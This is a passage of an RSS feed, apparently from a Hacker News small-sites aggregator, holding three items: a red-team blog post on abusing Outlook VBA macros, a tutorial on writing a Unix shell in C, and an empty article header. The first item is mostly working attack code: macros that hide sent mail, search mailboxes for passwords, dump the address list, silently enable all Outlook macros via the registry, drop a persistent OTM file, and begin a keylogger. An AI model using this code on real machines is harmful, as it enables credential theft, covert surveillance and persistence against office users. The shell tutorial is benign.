</code></pre></div></div> <p>If we do not want a copy in the “Sent” folder we can set the property <code>DeleteAfterSubmit</code> as <em>True</em> after we set the <code>Body</code>. This will move directly the mail to the Deleted folder, so it is a bit more stealthy. To fully erradicate the mail we need to locate the mail (as item) inside the Deleted folder and then call the method <a href="https://docs.microsoft.com/es-es/office/vba/api/outlook.items.remove"><code>Remove</code></a> via MAPI.</p>  <p>The object <code>Outlook.Application</code> gives us also access to the namespace <a href="https://docs.microsoft.com/es-es/office/vba/api/outlook.application.getnamespace">MAPI</a> and all its methods. This is important because we can interact with the mail boxes without knowing the credentials. For example, we can use our macro to search all the received mails that contains the word “password” in its body:</p> <div><div><pre><code><span>Sub</span> <span>retrieve_passwords</span><span>()</span>
    <span>Dim</span> <span>xOutApp</span> <span>As</span> <span>Object</span>
    <span>Dim</span> <span>xOutMail</span> <span>As</span> <span>Object</span>
    <span>Dim</span> <span>xMailBody</span> <span>As</span> <span>String</span>
    <span>Set</span> <span>xOutApp</span> <span>=</span> <span>CreateObject</span><span>(</span><span>"Outlook.Application"</span><span>)</span>
    <span>Set</span> <span>outlNameSpace</span> <span>=</span> <span>xOutApp</span><span>.</span><span>GetNamespace</span><span>(</span><span>"MAPI"</span><span>)</span>

    <span>Set</span> <span>myTasks</span> <span>=</span> <span>outlNameSpace</span><span>.</span><span>GetDefaultFolder</span><span>(</span><span>6</span><span>).</span><span>Items</span>
    <span>Dim</span> <span>i</span> <span>As</span> <span>Integer</span>
    <span>i</span> <span>=</span> <span>1</span>
    <span>For</span> <span>Each</span> <span>olMail</span> <span>In</span> <span>myTasks</span>
        <span>If</span> <span>(</span><span>InStr</span><span>(</span><span>1</span><span>,</span> <span>UCase</span><span>(</span><span>olMail</span><span>.</span><span>Body</span><span>),</span> <span>"PASSWORD"</span><span>,</span> <span>vbTextCompare</span><span>)</span> <span>&gt;</span> <span>0</span><span>)</span> <span>Then</span>
            <span>Cells</span><span>(</span><span>i</span><span>,</span> <span>1</span><span>)</span> <span>=</span> <span>olMail</span><span>.</span><span>Body</span> <span>' Here we are just showing the info in the Excel sheets, but you can exfiltrate it as we saw before ;D</span>
            <span>i</span> <span>=</span> <span>i</span> <span>+</span> <span>1</span>
        <span>End</span> <span>If</span>
    <span>Next</span>
    <span>Set</span> <span>xOutMail</span> <span>=</span> <span>Nothing</span>
    <span>Set</span> <span>xOutApp</span> <span>=</span> <span>Nothing</span>
<span>End</span> <span>Sub</span>
</code></pre></div></div> <p>Plaintext passwords inside mailboxes are probably one of the most common sins we are used to see in our engagements. A macro of this kind aimed to the right target can give you the Heaven’s keys.</p> <p>Another interesting information that we can get using MAPI is the Global Address List (GAL). In the address list we can find names, usernames, phone numbers, etc. Here we are just collecting usernames:</p> <div><div><pre><code><span>'https://www.excelcise.org/extract-outlook-global-address-list-details-with-vba/</span>
<span>Sub</span> <span>global_address_list</span><span>()</span>
    <span>Dim</span> <span>xOutApp</span> <span>As</span> <span>Object</span>
    <span>Dim</span> <span>xOutMail</span> <span>As</span> <span>Object</span>
    <span>Dim</span> <span>xMailBody</span> <span>As</span> <span>String</span>
    <span>Set</span> <span>xOutApp</span> <span>=</span> <span>CreateObject</span><span>(</span><span>"Outlook.Application"</span><span>)</span>
    <span>Set</span> <span>outlNameSpace</span> <span>=</span> <span>xOutApp</span><span>.</span><span>GetNamespace</span><span>(</span><span>"MAPI"</span><span>)</span>
    <span>Set</span> <span>outlGAL</span> <span>=</span> <span>outlNameSpace</span><span>.</span><span>GetGlobalAddressList</span><span>()</span>
    <span>Set</span> <span>outlEntry</span> <span>=</span> <span>outlGAL</span><span>.</span><span>AddressEntries</span>
        <span>On</span> <span>Error</span> <span>Resume</span> <span>Next</span>

    <span>'loop through address entries and extract details</span>
    <span>For</span> <span>i</span> <span>=</span> <span>1</span> <span>To</span> <span>outlEntry</span><span>.</span><span>Count</span>
        <span>Set</span> <span>outlMember</span> <span>=</span> <span>outlEntry</span><span>.</span><span>Item</span><span>(</span><span>i</span><span>)</span>
        <span>If</span> <span>outlMember</span><span>.</span><span>AddressEntryUserType</span> <span>=</span> <span>olExchangeUserAddressEntry</span> <span>Then</span>
           <span>Cells</span><span>(</span><span>i</span><span>,</span> <span>1</span><span>)</span> <span>=</span> <span>outlMember</span><span>.</span><span>GetExchangeUser</span><span>.</span><span>Name</span>  
        <span>End</span> <span>If</span>
    <span>Next</span> <span>i</span>
    <span>Set</span> <span>xOutMail</span> <span>=</span> <span>Nothing</span>
    <span>Set</span> <span>xOutApp</span> <span>=</span> <span>Nothing</span>
<span>End</span> <span>Sub</span>
</code></pre></div></div> <p>The main issue is that retrieving this information <strong>can take a really long time</strong> if the company is big (we are talking about ~5-10 minutes), so it is a bit unpractical to be used in a real scenario. However both approaches can be executed <strong>inside</strong> Outlook via OTM files as we will see below.</p>  <p>In the last years various persistence methods related to Outlook were released and implemented in the tool <strong><a href="https://github.com/sensepost/ruler">Ruler</a></strong>. These methods were based on the execution of VBA code via <a href="https://sensepost.com/blog/2017/outlook-forms-and-shells/">Custom Forms</a> and <a href="https://sensepost.com/blog/2017/outlook-home-page-another-ruler-vector/">Home Pages</a>. Both attacks are now patched, so we have to move forward.</p> <p>Recently <a href="https://twitter.com/domchell">Dominic Chell</a> published the article <a href="https://www.mdsec.co.uk/2020/11/a-fresh-outlook-on-mail-based-persistence/">A Fresh Outlook on Mail Based Persistence</a> where the persistence is achieved dropping a <strong>VbaProject.OTM</strong> file that is later loaded by Outlook. This is the path that we choosed here. But instead of using a payload to get a shell or parasite a process with our C2, we are going to create a keylogger in pure VBA <strong>:)</strong>.</p> <p>Outlook is one of the long term alive programs in an average office computer. It is launched since the workday beginning and is not closed until the worker leaves the office, so makes sense to use it as a keylogger. The plan is quite simple: we need to build an Excel file that modifies the registry (so Outlook can execute macros freely) and drops the OTM file with our keylogger.</p> <p>As the registry key is under <code>HKEY_CURRENT_USER</code> we do not need special privileges to modify the value (by default it is set at level 3 <em>Notifications for digitally signed macros, all other macros disabled</em>) so we enable the load and execution of macros by changing the value to 1 (<em>Enable all Macros</em>):</p> <div><div><pre><code><span>Sub</span> <span>disable_macro_security</span><span>()</span>
  <span>Dim</span> <span>myWS</span> <span>As</span> <span>Object</span>
  <span>Set</span> <span>myWS</span> <span>=</span> <span>VBA</span><span>.</span><span>CreateObject</span><span>(</span><span>"WScript.Shell"</span><span>)</span>
  <span>Dim</span> <span>name</span> <span>As</span> <span>String</span><span>,</span> <span>value</span> <span>As</span> <span>Integer</span><span>,</span> <span>stype</span> <span>As</span> <span>String</span>
  <span>name</span> <span>=</span> <span>"HKEY_CURRENT_USER\Software\Microsoft\Office\"</span> <span>&amp;</span> <span>Application</span><span>.</span><span>Version</span> <span>&amp;</span> <span>"\Outlook\Security\Level"</span>
  <span>value</span> <span>=</span> <span>1</span>
  <span>stype</span> <span>=</span> <span>"REG_DWORD"</span>
  <span>myWS</span><span>.</span><span>RegWrite</span> <span>name</span><span>,</span> <span>value</span><span>,</span> <span>stype</span>
<span>End</span> <span>Sub</span>
</code></pre></div></div> <p>We use the Excel version (<code>Application.Version</code>) to calculate the right location of the key to be modified. After that the OTM file can be dropped to <code>Environ("appdata") &amp; "\Microsoft\Outlook\VbaProject.OTM"</code> (it can be packed inside a resource, form, or taken directly from internet and then read/unpack and dropped). It is nothing new, all the good ol’ techniques to drop files apply here, let’s move to the OTM contents and the keylogger.</p> <p>For our keylogger we are going to use the function <strong><code>NtUserGetRawInputData</code></strong> that is not documented in the MSDN. But as usual: if something is not covered by Microsoft, go and check ReactOS. Luckily it is <a href="https://doxygen.reactos.org/d0/dc0/ntstubs_8c.html#ad041c37a6375f9be19cac8f4636d468e">documented</a>:</p> <div><div><pre><code><span>DWORD</span> <span>APIENTRY</span> <span>NtUserGetRawInputData</span> 	<span>(</span> 	<span>HRAWINPUT</span>  	<span>hRawInput</span><span>,</span>
		<span>UINT</span>  	<span>uiCommand</span><span>,</span>
		<span>LPVOID</span>  	<span>pData</span><span>,</span>
		<span>PUINT</span>  	<span>pcbSize</span><span>,</span>
		<span>UINT</span>  	<span>cbSizeHeader</span> 
	<span>)</span> 	
</code></pre></div></div> <p>Also we can see that it is exported by <a href="https://strontic.github.io/xcyclopedia/library/win32u.dll-7D649393F89A9DE3058162F8442130BC.html#win32udll">win32u.dll</a>, so our definition in VBA will be:</p> <div><div><pre><code><span>Private</span> <span>Declare</span> <span>PtrSafe</span> <span>Function</span> <span>NtUserGetRawInputData</span> <span>Lib</span> <span>"win32u"</span> <span>(</span><span>ByVal</span> <span>hRawInput</span> <span>As</span> <span>LongPtr</span><span>,</span> <span>ByVal</span> <span>uiCommand</span> <span>As</span> <span>LongLong</span><span>,</span> <span>ByRef</span> <span>pData</span> <span>As</span> <span>Any</span><span>,</span> <span>ByRef</span> <span>pcbSize</span> <span>As</span> <span>Long</span><span>,</span> <span>ByVal</span> <span>cbSizeHeader</span> <span>As</span> <span>Long</span><span>)</span> <span>As</span> <span>LongLong</span>
</code></pre></div></div> <p>Our approach will be the well-known technique of creating a window with a callback to snoop messages until we get a <code>WM_INPUT</code> and then use <code>NtUserGetRawInputData</code> to get the input data. To build the structures correctly (like <code>RAWKEYBOARD</code>) we can use <strong><code>offsetof</code></strong> as we described in our article <a href="https://adepts.of0x.cc/vba-tools/">Shedding light on creating VBA macros</a>, so we can check the size of each field and pick VBA types accordingly.</p> <p>Our macro has to be split in two parts</p> <ol> <li>The default module <code>ThisOutlookSession</code></li> <li>Another module created by us that we will rename to <code>Keylogger</code>.</li> </ol> <p>In <code>ThisOutlookSession</code> we only place the trigger that will execute our payload when Outlook starts:</p> <div><div><pre><code><span>Sub</span> <span>Application_Startup</span><span>()</span>
   <span>Keylogger</span><span>.</span><span>launcher</span>
<span>End</span> <span>Sub</span>
</code></pre></div></div> <p>We need to place the “real” payload inside another module to be allowed to use the operator <strong><a href="https://docs.microsoft.com/es-es/office/vba/language/reference/user-interface-help/invalid-use-of-addressof-operator">AddressOf</a></strong>, because we use it to set the callback to our window class. The <code>Keylogger</code> module code (remember: <strong>this is just a PoC</strong> that does not handle errors/exceptions, the intention of this code is just to exemplify how to build one):</p> <div><div><pre><code><span>'This can be hidden using DispCallFunc trick</span>
<span>Private</span> <span>Declare</span> <span>PtrSafe</span> <span>Function</span> <span>RegisterClassEx</span> <span>Lib</span> <span>"user32"</span> <span>Alias</span> <span>"RegisterClassExA"</span> <span>(</span><span>pcWndClassEx</span> <span>As</span> <span>WNDCLASSEX</span><span>)</span> <span>As</span> <span>Integer</span>
<span>Private</span> <span>Declare</span> <span>PtrSafe</span> <span>Function</span> <span>CreateWindowEx</span> <span>Lib</span> <span>"user32"</span> <span>Alias</span> <span>"CreateWindowExA"</span> <span>(</span><span>ByVal</span> <span>dwExStyle</span> <span>As</span> <span>Long</span><span>,</span> <span>ByVal</span> <span>lpClassName</span> <span>As</span> <span>String</span><span>,</span> <span>ByVal</span> <span>lpWindowName</span> <span>As</span> <span>String</span><span>,</span> <span>ByVal</span> <span>dwStyle</span> <span>As</span> <span>Long</span><span>,</span> <span>ByVal</span> <span>x</span> <span>As</span> <span>Long</span><span>,</span> <span>ByVal</span> <span>y</span> <span>As</span> <span>Long</span><span>,</span> <span>ByVal</span> <span>nWidth</span> <span>As</span> <span>Long</span><span>,</span> <span>ByVal</span> <span>nHeight</span> <span>As</span> <span>Long</span><span>,</span> <span>ByVal</span> <span>hWndParent</span> <span>As</span> <span>LongPtr</span><span>,</span> <span>ByVal</span> <span>hMenu</span> <span>As</span> <span>LongPtr</span><span>,</span> <span>ByVal</span> <span>hInstance</span> <span>As</span> <span>LongPtr</span><span>,</span> <span>ByVal</span> <span>lpParam</span> <span>As</span> <span>LongPtr</span><span>)</span> <span>As</span> <span>LongPtr</span>
<span>Private</span> <span>Declare</span> <span>PtrSafe</span> <span>Function</span> <span>DefWindowProc</span> <span>Lib</span> <span>"user32"</span> <span>Alias</span> <span>"DefWindowProcA"</span> <span>(</span><span>ByVal</span> <span>hwnd</span> <span>As</span> <span>LongPtr</span><span>,</span> <span>ByVal</span> <span>wMsg</span> <span>As</span> <span>Long</span><span>,</span> <span>ByVal</span> <span>wParam</span> <span>As</span> <span>LongPtr</span><span>,</span> <span>ByVal</span> <span>lParam</span> <span>As</span> <span>LongPtr</span><span>)</span> <span>As</span> <span>LongPtr</span>
<span>Private</span> <span>Declare</span> <span>PtrSafe</span> <span>Function</span> <span>GetMessage</span> <span>Lib</span> <span>"user32"</span> <span>Alias</span> <span>"GetMessageA"</span> <span>(</span><span>lpMsg</span> <span>As</span> <span>MSG</span><span>,</span> <span>ByVal</span> <span>hwnd</span> <span>As</span> <span>LongPtr</span><span>,</span> <span>ByVal</span> <span>wMsgFilterMin</span> <span>As</span> <span>Long</span><span>,</span> <span>ByVal</span> <span>wMsgFilterMax</span> <span>As</span> <span>Long</span><span>)</span> <span>As</span> <span>Long</span>
<span>Private</span> <span>Declare</span> <span>PtrSafe</span> <span>Function</span> <span>TranslateMessage</span> <span>Lib</span> <span>"user32"</span> <span>(</span><span>lpMsg</span> <span>As</span> <span>MSG</span><span>)</span> <span>As</span> <span>Long</span>
<span>Private</span> <span>Declare</span> <span>PtrSafe</span> <span>Function</span> <span>DispatchMessage</span> <span>Lib</span> <span>"user32"</span> <span>Alias</span> <span>"DispatchMessageA"</span> <span>(</span><span>lpMsg</span> <span>As</span> <span>MSG</span><span>)</span> <span>As</span> <span>LongPtr</span>
<span>Private</span> <span>Declare</span> <span>PtrSafe</span> <span>Function</span> <span>GetModuleHandle</span> <span>Lib</span> <span>"kernel32"</span> <span>Alias</span> <span>"GetModuleHandleA"</span> <span>(</span><span>ByVal</span> <span>lpModuleName</span> <span>As</span> <span>String</span><span>)</span> <span>As</span> <span>LongPtr</span>
<span>Private</span> <span>Declare</span> <span>PtrSafe</span> <span>Function</span> <span>RegisterRawInputDevices</span> <span>Lib</span> <span>"user32"</span> <span>(</span><span>ByRef</span> <span>pRawInputDevices</span> <span>As</span> <span>RAWINPUTDEVICE</span><span>,</span> <span>ByVal</span> <span>uiNumDevices</span> <span>As</span> <span>Integer</span><span>,</span> <span>ByVal</span> <span>cbSize</span> <span>As</span> <span>Integer</span><span>)</span> <span>As</span> <span>Boolean</span>
<span>Private</span> <span>Declare</span> <span>PtrSafe</span> <span>Function</span> <span>NtUserGetRawInputData</span> <span>Lib</span> <span>"win32u"</span> <span>(</span><span>ByVal</span> <span>hRawInput</span> <span>As</span> <span>LongPtr</span><span>,</span> <span>ByVal</span> <span>uiCommand</span> <span>As</span> <span>LongLong</span><span>,</span> <span>ByRef</span> <span>pData</span> <span>As</span> <span>Any</span><span>,</span> <span>ByRef</span> <span>pcbSize</span> <span>As</span> <span>Long</span><span>,</span> <span>ByVal</span> <span>cbSizeHead…</span></code></pre></div></div></div></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://adepts.of0x.cc/vba-outlook/">https://adepts.of0x.cc/vba-outlook/</a></em></p>]]>
            </description>
            <link>https://adepts.of0x.cc/vba-outlook/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26126067</guid>
            <pubDate>Sat, 13 Feb 2021 19:35:47 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Tutorial – Write a Shell in C]]>
            </title>
            <description>
<![CDATA[
Score 209 | Comments 48 (<a href="https://news.ycombinator.com/item?id=26126010">thread link</a>) | @mindcrime
<br/>
February 13, 2021 | https://brennan.io/2015/01/16/write-a-shell-in-c/ | <a href="https://web.archive.org/web/*/https://brennan.io/2015/01/16/write-a-shell-in-c/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

  
<p><em>Stephen Brennan • 16 January 2015</em></p><p>It’s easy to view yourself as “not a <em>real</em> programmer.”  There are programs out
there that everyone uses, and it’s easy to put their developers on a pedestal.
Although developing large software projects isn’t easy, many times the basic
idea of that software is quite simple.  Implementing it yourself is a fun way to
show that you have what it takes to be a real programmer.  So, this is a
walkthrough on how I wrote my own simplistic Unix shell in C, in the hopes that
it makes other people feel that way too.</p>

<p>The code for the shell described here, dubbed <code>lsh</code>, is available on
<a href="https://github.com/brenns10/lsh">GitHub</a>.</p>

<p><strong>University students beware!</strong> Many classes have assignments that ask you to
write a shell, and some faculty are aware of this tutorial and code.  If you’re
a student in such a class, you shouldn’t copy (or copy then modify) this code
without permission.  And even then, I would <a href="https://brennan.io/2016/03/29/dishonesty/">advise</a> against heavily relying on this tutorial.</p>

<h2 id="basic-lifetime-of-a-shell">Basic lifetime of a shell</h2>

<p>Let’s look at a shell from the top down.  A shell does three main things in its
lifetime.</p>

<ul>
  <li><strong>Initialize</strong>: In this step, a typical shell would read and execute its
configuration files.  These change aspects of the shell’s behavior.</li>
  <li><strong>Interpret</strong>: Next, the shell reads commands from stdin (which could be
interactive, or a file) and executes them.</li>
  <li><strong>Terminate</strong>: After its commands are executed, the shell executes any
shutdown commands, frees up any memory, and terminates.</li>
</ul>

<p>These steps are so general that they could apply to many programs, but we’re
going to use them for the basis for our shell.  Our shell will be so simple that
there won’t be any configuration files, and there won’t be any shutdown command.
So, we’ll just call the looping function and then terminate.  But in terms of
architecture, it’s important to keep in mind that the lifetime of the program is
more than just looping.</p>

<div><div><pre><code><span>int</span> <span>main</span><span>(</span><span>int</span> <span>argc</span><span>,</span> <span>char</span> <span>**</span><span>argv</span><span>)</span>
<span>{</span>
  <span>// Load config files, if any.
</span>
  <span>// Run command loop.
</span>  <span>lsh_loop</span><span>();</span>

  <span>// Perform any shutdown/cleanup.
</span>
  <span>return</span> <span>EXIT_SUCCESS</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>Here you can see that I just came up with a function, <code>lsh_loop()</code>, that will
loop, interpreting commands.  We’ll see the implementation of that next.</p>

<h2 id="basic-loop-of-a-shell">Basic loop of a shell</h2>

<p>So we’ve taken care of how the program should start up.  Now, for the basic
program logic: what does the shell do during its loop?  Well, a simple way to
handle commands is with three steps:</p>

<ul>
  <li><strong>Read</strong>: Read the command from standard input.</li>
  <li><strong>Parse</strong>: Separate the command string into a program and arguments.</li>
  <li><strong>Execute</strong>: Run the parsed command.</li>
</ul>

<p>Here, I’ll translate those ideas into code for <code>lsh_loop()</code>:</p>

<div><div><pre><code><span>void</span> <span>lsh_loop</span><span>(</span><span>void</span><span>)</span>
<span>{</span>
  <span>char</span> <span>*</span><span>line</span><span>;</span>
  <span>char</span> <span>**</span><span>args</span><span>;</span>
  <span>int</span> <span>status</span><span>;</span>

  <span>do</span> <span>{</span>
    <span>printf</span><span>(</span><span>"&gt; "</span><span>);</span>
    <span>line</span> <span>=</span> <span>lsh_read_line</span><span>();</span>
    <span>args</span> <span>=</span> <span>lsh_split_line</span><span>(</span><span>line</span><span>);</span>
    <span>status</span> <span>=</span> <span>lsh_execute</span><span>(</span><span>args</span><span>);</span>

    <span>free</span><span>(</span><span>line</span><span>);</span>
    <span>free</span><span>(</span><span>args</span><span>);</span>
  <span>}</span> <span>while</span> <span>(</span><span>status</span><span>);</span>
<span>}</span>
</code></pre></div></div>

<p>Let’s walk through the code.  The first few lines are just declarations.  The
do-while loop is more convenient for checking the status variable, because it
executes once before checking its value.  Within the loop, we print a prompt,
call a function to read a line, call a function to split the line into args, and
execute the args.  Finally, we free the line and arguments that we created
earlier.  Note that we’re using a status variable returned by <code>lsh_execute()</code> to
determine when to exit.</p>

<h2 id="reading-a-line">Reading a line</h2>

<p>Reading a line from stdin sounds so simple, but in C it can be a hassle.  The
sad thing is that you don’t know ahead of time how much text a user will enter
into their shell.  You can’t simply allocate a block and hope they don’t exceed
it.  Instead, you need to start with a block, and if they do exceed it,
reallocate with more space.  This is a common strategy in C, and we’ll use it to
implement <code>lsh_read_line()</code>.</p>

<div><div><pre><code><span>#define LSH_RL_BUFSIZE 1024
</span><span>char</span> <span>*</span><span>lsh_read_line</span><span>(</span><span>void</span><span>)</span>
<span>{</span>
  <span>int</span> <span>bufsize</span> <span>=</span> <span>LSH_RL_BUFSIZE</span><span>;</span>
  <span>int</span> <span>position</span> <span>=</span> <span>0</span><span>;</span>
  <span>char</span> <span>*</span><span>buffer</span> <span>=</span> <span>malloc</span><span>(</span><span>sizeof</span><span>(</span><span>char</span><span>)</span> <span>*</span> <span>bufsize</span><span>);</span>
  <span>int</span> <span>c</span><span>;</span>

  <span>if</span> <span>(</span><span>!</span><span>buffer</span><span>)</span> <span>{</span>
    <span>fprintf</span><span>(</span><span>stderr</span><span>,</span> <span>"lsh: allocation error</span><span>\n</span><span>"</span><span>);</span>
    <span>exit</span><span>(</span><span>EXIT_FAILURE</span><span>);</span>
  <span>}</span>

  <span>while</span> <span>(</span><span>1</span><span>)</span> <span>{</span>
    <span>// Read a character
</span>    <span>c</span> <span>=</span> <span>getchar</span><span>();</span>

    <span>// If we hit EOF, replace it with a null character and return.
</span>    <span>if</span> <span>(</span><span>c</span> <span>==</span> <span>EOF</span> <span>||</span> <span>c</span> <span>==</span> <span>'\n'</span><span>)</span> <span>{</span>
      <span>buffer</span><span>[</span><span>position</span><span>]</span> <span>=</span> <span>'\0'</span><span>;</span>
      <span>return</span> <span>buffer</span><span>;</span>
    <span>}</span> <span>else</span> <span>{</span>
      <span>buffer</span><span>[</span><span>position</span><span>]</span> <span>=</span> <span>c</span><span>;</span>
    <span>}</span>
    <span>position</span><span>++</span><span>;</span>

    <span>// If we have exceeded the buffer, reallocate.
</span>    <span>if</span> <span>(</span><span>position</span> <span>&gt;=</span> <span>bufsize</span><span>)</span> <span>{</span>
      <span>bufsize</span> <span>+=</span> <span>LSH_RL_BUFSIZE</span><span>;</span>
      <span>buffer</span> <span>=</span> <span>realloc</span><span>(</span><span>buffer</span><span>,</span> <span>bufsize</span><span>);</span>
      <span>if</span> <span>(</span><span>!</span><span>buffer</span><span>)</span> <span>{</span>
        <span>fprintf</span><span>(</span><span>stderr</span><span>,</span> <span>"lsh: allocation error</span><span>\n</span><span>"</span><span>);</span>
        <span>exit</span><span>(</span><span>EXIT_FAILURE</span><span>);</span>
      <span>}</span>
    <span>}</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>

<p>The first part is a lot of declarations.  If you hadn’t noticed, I prefer to
keep the old C style of declaring variables before the rest of the code.  The
meat of the function is within the (apparently infinite) <code>while (1)</code> loop.  In
the loop, we read a character (and store it as an <code>int</code>, not a <code>char</code>, that’s
important!  EOF is an integer, not a character, and if you want to check for it,
you need to use an <code>int</code>.  This is a common beginner C mistake.).  If it’s the
newline, or EOF, we null terminate our current string and return it.  Otherwise,
we add the character to our existing string.</p>

<p>Next, we see whether the next character will go outside of our current buffer
size.  If so, we reallocate our buffer (checking for allocation errors) before
continuing.  And that’s really it.</p>

<p>Those who are intimately familiar with newer versions of the C library may note
that there is a <code>getline()</code> function in <code>stdio.h</code> that does most of the work we
just implemented.  To be completely honest, I didn’t know it existed until after
I wrote this code.  This function was a GNU extension to the C library until
2008, when it was added to the specification, so most modern Unixes should have
it now.  I’m leaving my existing code the way it is, and I encourage people to
learn it this way first before using <code>getline</code>.  You’d be robbing yourself of a
learning opportunity if you didn’t!  Anyhow, with <code>getline</code>, the function
becomes easier:</p>

<div><div><pre><code><span>char</span> <span>*</span><span>lsh_read_line</span><span>(</span><span>void</span><span>)</span>
<span>{</span>
  <span>char</span> <span>*</span><span>line</span> <span>=</span> <span>NULL</span><span>;</span>
  <span>ssize_t</span> <span>bufsize</span> <span>=</span> <span>0</span><span>;</span> <span>// have getline allocate a buffer for us
</span>
  <span>if</span> <span>(</span><span>getline</span><span>(</span><span>&amp;</span><span>line</span><span>,</span> <span>&amp;</span><span>bufsize</span><span>,</span> <span>stdin</span><span>)</span> <span>==</span> <span>-</span><span>1</span><span>){</span>
    <span>if</span> <span>(</span><span>feof</span><span>(</span><span>stdin</span><span>))</span> <span>{</span>
      <span>exit</span><span>(</span><span>EXIT_SUCCESS</span><span>);</span>  <span>// We recieved an EOF
</span>    <span>}</span> <span>else</span>  <span>{</span>
      <span>perror</span><span>(</span><span>"readline"</span><span>);</span>
      <span>exit</span><span>(</span><span>EXIT_FAILURE</span><span>);</span>
    <span>}</span>
  <span>}</span>

  <span>return</span> <span>line</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>This is not 100% trivial because we still need to check for EOF or errors while
reading. EOF (end of file) means that either we were reading commands from a
text file which we’ve reached the end of, or the user typed Ctrl-D, which
signals end-of-file. Either way, it means we should exit successfully, and if
any other error occurs, we should fail after printing the error.</p>

<h2 id="parsing-the-line">Parsing the line</h2>

<p>OK, so if we look back at the loop, we see that we now have implemented
<code>lsh_read_line()</code>, and we have the line of input.  Now, we need to parse that
line into a list of arguments.  I’m going to make a glaring simplification here,
and say that we won’t allow quoting or backslash escaping in our command line
arguments.  Instead, we will simply use whitespace to separate arguments from
each other.  So the command <code>echo "this message"</code> would not call echo with a
single argument <code>this message</code>, but rather it would call echo with two
arguments: <code>"this</code> and <code>message"</code>.</p>

<p>With those simplifications, all we need to do is “tokenize” the string using
whitespace as delimiters.  That means we can break out the classic library
function <code>strtok</code> to do some of the dirty work for us.</p>

<div><div><pre><code><span>#define LSH_TOK_BUFSIZE 64
#define LSH_TOK_DELIM " \t\r\n\a"
</span><span>char</span> <span>**</span><span>lsh_split_line</span><span>(</span><span>char</span> <span>*</span><span>line</span><span>)</span>
<span>{</span>
  <span>int</span> <span>bufsize</span> <span>=</span> <span>LSH_TOK_BUFSIZE</span><span>,</span> <span>position</span> <span>=</span> <span>0</span><span>;</span>
  <span>char</span> <span>**</span><span>tokens</span> <span>=</span> <span>malloc</span><span>(</span><span>bufsize</span> <span>*</span> <span>sizeof</span><span>(</span><span>char</span><span>*</span><span>));</span>
  <span>char</span> <span>*</span><span>token</span><span>;</span>

  <span>if</span> <span>(</span><span>!</span><span>tokens</span><span>)</span> <span>{</span>
    <span>fprintf</span><span>(</span><span>stderr</span><span>,</span> <span>"lsh: allocation error</span><span>\n</span><span>"</span><span>);</span>
    <span>exit</span><span>(</span><span>EXIT_FAILURE</span><span>);</span>
  <span>}</span>

  <span>token</span> <span>=</span> <span>strtok</span><span>(</span><span>line</span><span>,</span> <span>LSH_TOK_DELIM</span><span>);</span>
  <span>while</span> <span>(</span><span>token</span> <span>!=</span> <span>NULL</span><span>)</span> <span>{</span>
    <span>tokens</span><span>[</span><span>position</span><span>]</span> <span>=</span> <span>token</span><span>;</span>
    <span>position</span><span>++</span><span>;</span>

    <span>if</span> <span>(</span><span>position</span> <span>&gt;=</span> <span>bufsize</span><span>)</span> <span>{</span>
      <span>bufsize</span> <span>+=</span> <span>LSH_TOK_BUFSIZE</span><span>;</span>
      <span>tokens</span> <span>=</span> <span>realloc</span><span>(</span><span>tokens</span><span>,</span> <span>bufsize</span> <span>*</span> <span>sizeof</span><span>(</span><span>char</span><span>*</span><span>));</span>
      <span>if</span> <span>(</span><span>!</span><span>tokens</span><span>)</span> <span>{</span>
        <span>fprintf</span><span>(</span><span>stderr</span><span>,</span> <span>"lsh: allocation error</span><span>\n</span><span>"</span><span>);</span>
        <span>exit</span><span>(</span><span>EXIT_FAILURE</span><span>);</span>
      <span>}</span>
    <span>}</span>

    <span>token</span> <span>=</span> <span>strtok</span><span>(</span><span>NULL</span><span>,</span> <span>LSH_TOK_DELIM</span><span>);</span>
  <span>}</span>
  <span>tokens</span><span>[</span><span>position</span><span>]</span> <span>=</span> <span>NULL</span><span>;</span>
  <span>return</span> <span>tokens</span><span>;</span>
<span>}</span>
</code></pre></div></div>

<p>If this code looks suspiciously similar to <code>lsh_read_line()</code>, it’s because it
is!  We are using the same strategy of having a buffer and dynamically expanding
it.  But this time, we’re doing it with a null-terminated array of pointers
instead of a null-terminated array of characters.</p>

<p>At the start of the function, we begin tokenizing by calling <code>strtok</code>.  It
returns a pointer to the first token.  What <code>strtok()</code> actually does is return
pointers to within the string you give it, and place <code>\0</code> bytes at the end of
each token.  We store each pointer in an array (buffer) of character
pointers.</p>

<p>Finally, we reallocate the array of pointers if necessary.  The process repeats
until no token is returned by <code>strtok</code>, at which point we null-terminate the
list of tokens.</p>

<p>So, once all is said and done, we have an array of tokens, ready to execute.
Which begs the question, how do we do that?</p>



<p>Now, we’re really at the heart of what a shell does.  Starting processes is the
main function of shells.  So writing a shell means that you need to know exactly
what’s going on with processes and how they start.  That’s why I’m going to take
us on a short diversion to discuss processes in Unix.</p>

<p>There are only two ways of starting processes on Unix.  The first one (which
almost doesn’t count) is by being Init.  You see, when a Unix computer boots,
its kernel is loaded.  Once it is loaded and initialized, the kernel starts only
one process, which is called Init.  This process runs for the entire length of
time that the computer is on, and it manages loading up the rest of the
processes that you need for your computer to be useful.</p>

<p>Since most programs aren’t Init, that leaves only one practical way for
processes to get started: the <code>fork()</code> system call.  When …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://brennan.io/2015/01/16/write-a-shell-in-c/">https://brennan.io/2015/01/16/write-a-shell-in-c/</a></em></p>]]>
            </description>
            <link>https://brennan.io/2015/01/16/write-a-shell-in-c/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26126010</guid>
            <pubDate>Sat, 13 Feb 2021 19:29:43 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Lambda the Ultimate Pattern Factory (2018)]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=26126002">thread link</a>) | @coolgeek
<br/>
February 13, 2021 | https://thma.github.io/posts/2018-11-24-lambda-the-ultimate-pattern-factory.html | <a href="https://web.archive.org/web/*/https://thma.github.io/posts/2018-11-24-lambda-the-ultimate-pattern-factory.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">
    
    <div>
